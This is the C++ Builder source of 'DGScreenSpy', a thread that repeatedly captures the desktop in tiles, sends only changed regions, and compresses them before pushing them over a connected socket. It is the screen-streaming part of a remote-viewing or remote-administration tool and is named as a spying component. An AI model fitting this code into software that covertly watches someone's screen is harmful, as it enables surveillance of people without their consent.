/*******************************************}
{      DGScreenSpy - ScreenSpy              }
{      Version: 0.4c                        }
{      Author:  BCB-DG                      }
{      EMail:   iamgyg@163.com              }
{      QQ:      112275024                   }
{      Blog:    http://iamgyg.blog.163.com  }
{*******************************************/
//---------------------------------------------------------------------------
#pragma hdrstop
#include "ScreenSpy.h"
//---------------------------------------------------------------------------

__fastcall TScreenSpy::TScreenSpy(): TThread(true)
{
    FreeOnTerminate = true;
    FmsScr   = new TMemoryStream;
    FmsSend  = new TMemoryStream;
    for (int i = 0; i <= BNUMS; i++) FBmps[i] = new Graphics::TBitmap;
    FWidth   = 0;
    FHeight  = 0;
    FPixelFormat= pf8bit;
}
//---------------------------------------------------------------------------

__fastcall TScreenSpy::~TScreenSpy()
{
    delete FmsScr;
    delete FmsSend;
    for (int i = 0; i <= BNUMS; i++) delete FBmps[i];
}
//---------------------------------------------------------------------------

void __fastcall TScreenSpy::Execute()
{
    while (!Terminated && FSocket->State == wsConnected)
    {
        if (CheckScr()) GetFirst(); else GetNext();
        Sleep(30);
    }
}
//---------------------------------------------------------------------------

bool __fastcall TScreenSpy::CheckScr()
{
    int nWidth  = GetSystemMetrics(SM_CXSCREEN);
    int nHeight = GetSystemMetrics(SM_CYSCREEN);
    if (nWidth != FWidth || nHeight != FHeight)
    {
        FWidth  = nWidth;
        FHeight = nHeight;
        FBWidth = (FWidth + BSIZE - 1)  / BSIZE;
        FBHeight= (FHeight + BSIZE - 1) / BSIZE;
        for (int i = 0; i <= BNUMS; i++)
        {
            FBmps[i]->Width  = FBWidth;
            FBmps[i]->Height = FBHeight;
            FBmps[i]->PixelFormat = FPixelFormat;
        }
        switch (FPixelFormat)
        {
            case pf1bit:
                FSize = BytesPerScanline(FBWidth, 1, 32) * FBHeight;
                break;
            case pf4bit:
                FSize = BytesPerScanline(FBWidth, 4, 32) * FBHeight;
                break;
            case pf8bit:
                FSize = BytesPerScanline(FBWidth, 8, 32) * FBHeight;
                break;
            case pf16bit:
                FSize = BytesPerScanline(FBWidth, 16, 32) * FBHeight;
                break;
            case pf24bit:
                FSize = BytesPerScanline(FBWidth, 24, 32) * FBHeight;
                break;
            case pf32bit:
                FSize = BytesPerScanline(FBWidth, 32, 32) * FBHeight;
                break;
            default:
                FSize = BytesPerScanline(FBWidth, 4, 32) * FBHeight;
                break;
        }
        return true;
    }
    return false;
}
//---------------------------------------------------------------------------

void __fastcall TScreenSpy::GetFirst()
{
    TRect rt;
    int l, t;
    FmsScr->Clear();
    FDC = GetDC(0);
    for (int i = 0; i < BNUMS; i++)
    {
        l = (i % BSIZE) * FBWidth;
        t = (i / BSIZE) * FBHeight;
        BitBlt(FBmps[i]->Canvas->Handle, 0, 0, FBWidth, FBHeight, FDC, l, t, SRCCOPY);
        SetRect(&rt, l, t, l + FBWidth, t + FBHeight);
        FmsScr->WriteBuffer(&rt, sizeof(rt));
        FBmps[i]->SaveToStream(FmsScr);
    }
    ReleaseDC(0, FDC);
    SendData(1);
}
//---------------------------------------------------------------------------

void __fastcall TScreenSpy::GetNext()
{
    TRect rt;
    TPoint pt;
    int i, l, t;
    FmsScr->Clear();
    for (i = 0; i < BNUMS; i++)
    {
        FFlag1[i] = FFocus[i] > 0;
        FFlag2[i] = false;
    }
    GetCursorPos(&pt);
    FFlag1[pt.x / FBWidth + pt.y / FBHeight * BSIZE] = true;
    FDC = GetDC(0);
    i = 0;
    while (i < BNUMS)
    {
        if (FFlag1[i] && (!FFlag2[i])) 
        {
            FFlag2[i] = true;
            l = (i % BSIZE) * FBWidth;
            t = (i / BSIZE) * FBHeight;
            FBmps[BNUMS]->Canvas->Lock();
            try
            {
                BitBlt(FBmps[BNUMS]->Canvas->Handle, 0, 0, FBWidth, FBHeight, FDC, l, t, SRCCOPY);
            }
            __finally
            {
                FBmps[BNUMS]->Canvas->Unlock();
            }
            if (CompareMem(FBmps[i]->ScanLine[FBHeight - 1], FBmps[BNUMS]->ScanLine[FBHeight - 1], FSize))
                FFocus[i] = Max(FFocus[i] - 1, 0);
            else
            {
                FBmps[i]->Canvas->Lock();
                try
                {
                    BitBlt(FBmps[i]->Canvas->Handle, 0, 0, FBWidth, FBHeight, FDC, l, t, SRCCOPY);
                }
                __finally
                {
                    FBmps[i]->Canvas->Unlock();
                }
                FFocus[i] = 5;
                SetRect(&rt, l, t, l +  FBWidth, t + FBHeight);
                FmsScr->WriteBuffer(&rt, sizeof(rt));
                FBmps[i]->SaveToStream(FmsScr);
                if ((i - BSIZE) >= 0) FFlag1[i - BSIZE] = true;
                if ((i + BSIZE) <= (BNUMS - 1)) FFlag1[i + BSIZE] = true;
                if ((i % BSIZE) != 0) FFlag1[i - 1] = true;
                if ((i % BSIZE) != (BSIZE - 1)) FFlag1[i + 1] = true;
                i = Max(Min(i - BSIZE, i - 1), 0);
                continue;
            }
        }
        i++;
    }
    ReleaseDC(0, FDC);
    if (FmsScr->Size > 0) SendData(2);
}
//---------------------------------------------------------------------------

void __fastcall TScreenSpy::SendData(Byte nCmd)
{
    try
    {
        FmsSend->Clear();
        FmsScr->Position = 0;
        ZCompressStream(FmsScr, FmsSend);
        FmsSend->Position = 0;
        FCmd.Cmd  = nCmd;
        FCmd.Size = FmsSend->Size;
        FSocket->Send(&FCmd, sizeof(TSpyCmd));
        FSocket->Send(FmsSend->Memory, FmsSend->Size);
    }
    catch(...)
    {}
}
//---------------------------------------------------------------------------
#pragma package(smart_init)

